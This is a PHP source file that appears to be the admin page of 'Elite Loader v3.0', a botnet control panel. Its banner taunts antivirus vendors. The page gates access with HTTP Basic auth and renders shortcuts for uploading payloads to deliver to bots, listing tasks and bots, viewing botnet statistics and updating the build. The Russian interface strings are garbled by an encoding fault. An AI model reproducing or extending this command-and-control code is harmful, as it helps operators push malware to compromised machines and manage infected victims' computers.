<?php
#################################################
#             Elite Loader v3.0                 #
#                                               #
#    (c)oded by [PRO]MAKE.ME TeaM :P            #
#                                               #
# To BBC and McAfee:                            #
# Project to capture The World                  #
#                      in the implementation.   #
#                                               #
#            You lose! Who next? :)             #
#                                               #
#################################################
require('../config.php');
if((!isset($_SERVER['PHP_AUTH_USER'])) || !(($_SERVER['PHP_AUTH_USER'] == ROOT_LOGIN) && ($_SERVER['PHP_AUTH_PW'] == ROOT_PASSW))){
  header("WWW-Authenticate: Basic entrer='Form2txt admin'");
  header("WWW-Authenticate: Basic Realm=Admin");
  header("HTTP/1.0 401 Unauthorized");
  exit();
}
if(LANGUAGE == 'ru'){
  $load[0] = '�������� ������ � ��������...';
  $load[1] = '�������� ����...';
  $load[2] = '�������� �������...';
  $load[3] = '�����������...';
  $load[4] = '�������� ����������...';

  $icon[0] = '�������� ���� ��� ��������';
  $icon[1] = '������ ������� ��������';
  $icon[2] = '����������';
  $icon[3] = '������ �����';
  $icon[4] = '���������� �����';
}else{
  $load[0] = 'Load styles and images...';
  $load[1] = 'Load core...';
  $load[2] = 'Load modules...';
  $load[3] = 'Localizing...';
  $load[4] = 'Load interface...';

  $icon[0] = 'Add file for Loads';
  $icon[1] = 'List task Loads';
  $icon[2] = 'Stats botnet';
  $icon[3] = 'List bots';
  $icon[4] = 'Update build';
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=<?=((LANGUAGE=='ru')?'utf-8':'windows-1251');?>" />
<title>Elite Loader :: Admin</title>
<link rel="icon" href="favicon.ico" type="image/x-icon">
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
<link rel="stylesheet" type="text/css" href="resources/css/core.php" />
<link rel="stylesheet" type="text/css" href="style.css" />
</head>
<body>
<div id="loader-mask" style=""></div>
<div id="loader">
    <div class="loader-indicator"><br /><br /><br /><span id="loader-msg"><?=$load[0];?></span></div>
</div>
<script type="text/javascript">document.getElementById('loader-msg').innerHTML = '<?=$load[1];?>';</script>
<script type="text/javascript" src="adapter/core.php?type=extbase"></script>
<script type="text/javascript" src="adapter/core.php?type=extall"></script>
<script type="text/javascript">Ext.BLANK_IMAGE_URL = 'images/s.gif';</script>
<script type="text/javascript">document.getElementById('loader-msg').innerHTML = '<?=$load[2];?>';</script>
<script type="text/javascript" src="adapter/core.php?type=modules&lang=<?=LANGUAGE;?>"></script>
<script type="text/javascript">document.getElementById('loader-msg').innerHTML = '<?=$load[3];?>';</script>
<script type="text/javascript" src="adapter/ext-lang-<?=LANGUAGE;?>.js"></script>
<script type="text/javascript">document.getElementById('loader-msg').innerHTML = '<?=$load[4];?>';</script>
<div id="x-desktop">
    <div id="logo"><a href="http://www.promake.me" target="_blank"><img src="images/logo.png" border="0"></a></div>
    <table border="0" id="x-shortcuts">
      <tr>
        <td id="addtask-loads-win-shortcut">
            <a href="#" OnClick="javascript:AddLoadsWindow.show();"><img src="images/s.gif" />
            <div><?=$icon[0];?></div></a>
        </td>
        <td id="task-loads-win-shortcut">
            <a href="#" OnClick="javascript:LoadListingWindow.show();"><img src="images/s.gif" />
            <div><?=$icon[1];?></div></a>
        </td>
        <td>&nbsp;</td>
      </tr>
      <tr>
        <td id="bots-win-shortcut">
            <a href="#" OnClick="javascript:BotsListingWindow.show();"><img src="images/s.gif" />
            <div><?=$icon[3];?></div></a>
        </td>
        <td id="stats-win-shortcut">
            <a href="#" OnClick="javascript:StatsCreateWindow.show();"><img src="images/s.gif" />
            <div><?=$icon[2];?></div></a>
        </td>
        <td id="file-win-shortcut">
            <a href="#" OnClick="javascript:FileUploadWindow.show();"><img src="images/s.gif" />
            <div><?=$icon[4];?></div></a>
        </td>
      <tr>
    </table>
    <div id="placeholder" style="width:250px;height:250px;"></div>
</div>
<script type="text/javascript">
Ext.onReady(function(){
    setTimeout(function(){
        Ext.get('loader').remove();
        Ext.get('loader-mask').fadeOut({remove:true});
    }, 250);
});
</script>
</body>
</html>
